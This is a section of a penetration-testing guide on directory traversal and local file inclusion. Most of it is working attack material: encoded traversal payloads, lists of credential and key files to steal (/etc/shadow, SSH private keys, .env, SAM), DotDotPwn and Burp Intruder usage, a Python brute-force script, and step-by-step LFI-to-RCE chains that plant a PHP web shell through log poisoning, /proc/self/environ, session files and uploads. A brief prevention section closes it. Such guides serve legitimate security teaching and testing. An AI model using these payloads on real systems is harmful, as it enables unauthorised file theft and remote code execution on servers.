# 6. DIRECTORY TRAVERSAL <a name="directory-traversal"></a>

## 6.1 THEORY & BACKGROUND

**Directory Traversal** (Path Traversal) allows attackers to access files outside the intended directory by manipulating file path inputs.

**Impact:**
- Read sensitive files (passwords, config files, source code)
- Access system files (/etc/passwd, /etc/shadow)
- Read application source code
- Access other users' files
- Potential RCE if combined with file upload

**Common Vulnerable Parameters:**
- file=
- document=
- path=
- page=
- include=
- download=
- template=

---

## 6.2 IDENTIFICATION & EXPLOITATION

### 6.2.1 Basic Techniques

**Unix/Linux Systems:**

```bash
# Basic traversal
http://site.com/download?file=../../../etc/passwd

# Absolute path
http://site.com/download?file=/etc/passwd

# Null byte (older PHP versions)
http://site.com/download?file=../../../etc/passwd%00

# URL encoding
http://site.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd

# Double URL encoding
http://site.com/download?file=..%252F..%252F..%252Fetc%252Fpasswd

# Unicode encoding
http://site.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# 16-bit Unicode
http://site.com/download?file=..%u2216..%u2216..%u2216etc%u2216passwd

# Stripped traversal sequences
http://site.com/download?file=....//....//....//etc/passwd

# Nested traversal
http://site.com/download?file=..././..././..././etc/passwd
```

**Windows Systems:**

```bash
# Basic traversal
http://site.com/download?file=..\..\..\windows\win.ini

# Forward slashes (also work on Windows)
http://site.com/download?file=../../../windows/win.ini

# UNC paths
http://site.com/download?file=\\server\share\file.txt

# Absolute path
http://site.com/download?file=C:\windows\win.ini

# URL encoded backslashes
http://site.com/download?file=..%5c..%5c..%5cwindows%5cwin.ini
```

### 6.2.2 Common Target Files

**Linux/Unix:**

```bash
# System files
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (if readable)
/etc/group            # Group information
/etc/hosts            # Host mappings
/etc/hostname         # Hostname
/etc/issue            # OS version
/etc/motd             # Message of the day

# SSH keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys

# Application configs
/var/www/html/config.php
/var/www/html/.env
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf

# Logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog

# Process info
/proc/self/environ     # Environment variables
/proc/self/cmdline     # Command line
/proc/self/status      # Process status
/proc/self/fd/N        # File descriptors

# Database
/var/lib/mysql/mysql/user.MYD
```

**Windows:**

```bash
# System files
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\sam
C:\windows\system32\config\system

# IIS logs
C:\inetpub\logs\LogFiles\W3SVC1\exYYMMDD.log

# Application configs
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php

# User files
C:\Users\Administrator\Desktop\passwords.txt
C:\Users\Administrator\Documents\
```

### 6.2.3 Automated Testing

**Using DotDotPwn:**

```bash
# HTTP
dotdotpwn.pl -m http -h site.com -x 80 -f /etc/passwd -k "root:"

# FTP
dotdotpwn.pl -m ftp -h site.com -x 21 -U user -P pass -f /etc/passwd

# TFTP
dotdotpwn.pl -m tftp -h site.com -f /etc/passwd
```

**Using Burp Suite:**

```bash
# 1. Capture request with file parameter
GET /download?file=document.pdf HTTP/1.1

# 2. Send to Intruder
# 3. Mark 'file' parameter as payload position
# 4. Load traversal payloads:

../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd

..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd

# 5. Start attack
# 6. Look for successful responses (different length/content)
```

**Custom Script:**

```python
#!/usr/bin/env python3
import requests

url = "http://site.com/download"
target_file = "etc/passwd"
success_string = "root:"

for depth in range(1, 10):
    traversal = "../" * depth + target_file
    
    # Try different encodings
    payloads = [
        traversal,
        traversal.replace("/", "%2F"),
        traversal.replace("/", "%252F"),
        traversal.replace(".", "%2E"),
        traversal.replace("../", "....//"),
        traversal.replace("../", "..;/")
    ]
    
    for payload in payloads:
        r = requests.get(url, params={"file": payload})
        
        if success_string in r.text:
            print(f"[+] Found: {payload}")
            print(r.text)
            break
```

### 6.2.4 Advanced Exploitation

**LFI to RCE via Log Poisoning:**

```bash
# 1. Identify accessible log file
http://site.com/view?file=../../var/log/apache2/access.log

# 2. Inject PHP code into log via User-Agent
curl http://site.com/ -A "<?php system(\$_GET['cmd']); ?>"

# 3. Include log file and execute command
http://site.com/view?file=../../var/log/apache2/access.log&cmd=whoami

# Works because User-Agent is logged, then included and executed!
```

**LFI to RCE via /proc/self/environ:**

```bash
# 1. Access environment variables
http://site.com/view?file=../../proc/self/environ

# 2. Inject code via User-Agent (stored in environment)
curl http://site.com/ -A "<?php system(\$_GET['cmd']); ?>"

# 3. Include environ and execute
http://site.com/view?file=../../proc/self/environ&cmd=whoami
```

**LFI to RCE via PHP Session Files:**

```bash
# 1. Find PHP session file location
# Usually: /var/lib/php/sessions/sess_[PHPSESSID]

# 2. Inject code into session
http://site.com/page.php?lang=en&name=<?php system($_GET['cmd']); ?>

# 3. Include session file
http://site.com/view?file=../../var/lib/php/sessions/sess_YOURSESSIONID&cmd=whoami
```

**LFI to RCE via File Upload + Include:**

```bash
# 1. Upload file with PHP code disguised as image
# filename: shell.jpg
# content: <?php system($_GET['cmd']); ?>

# 2. File stored at: /var/www/uploads/shell.jpg

# 3. Include uploaded file
http://site.com/view?file=../../uploads/shell.jpg&cmd=whoami

# PHP executes code from .jpg file!
```

---

## 6.3 PREVENTION

```php
// VULNERABLE CODE:
$file = $_GET['file'];
include("/var/www/html/documents/" . $file);

// ATTACK:
// ?file=../../../etc/passwd

// SECURE CODE:

// Method 1: Whitelist allowed files
$allowed_files = ['doc1.pdf', 'doc2.pdf', 'doc3.pdf'];
$file = $_GET['file'];

if (!in_array($file, $allowed_files)) {
    die('Invalid file');
}

include("/var/www/html/documents/" . $file);

// Method 2: Remove traversal sequences
$file = str_replace(['../', '..\\'], '', $_GET['file']);
$file = basename($file); // Remove directory path
include("/var/www/html/documents/" . $file);

// Method 3: Validate with realpath
$base_dir = '/var/www/html/documents/';
$file = $_GET['file'];
$full_path = realpath($base_dir . $file);

// Check if resolved path starts with base directory
if (strpos($full_path, $base_dir) !== 0) {
    die('Invalid file path');
}

include($full_path);

// Method 4: Use file ID instead of filename
$file_id = $_GET['id'];
$file_mapping = [
    1 => 'document1.pdf',
    2 => 'document2.pdf',
    3 => 'document3.pdf'
];

if (!isset($file_mapping[$file_id])) {
    die('Invalid file ID');
}

include("/var/www/html/documents/" . $file_mapping[$file_id]);
```

---
